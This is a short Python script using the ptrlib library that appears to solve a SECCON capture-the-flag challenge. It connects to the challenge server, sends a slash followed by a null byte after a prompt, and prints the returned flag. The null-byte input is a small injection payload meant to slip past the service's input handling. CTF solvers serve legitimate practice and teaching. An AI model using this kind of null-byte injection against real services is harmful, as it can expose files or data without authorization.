from ptrlib import *
import os

HOST = os.getenv('SECCON_HOST', "localhost")
PORT = os.getenv('SECCON_PORT', "10042")

sock = Socket(HOST, int(PORT))

sock.sendlineafter(": ", "/\x00")
print(sock.recvregex("SECCON.+"))

sock.close()
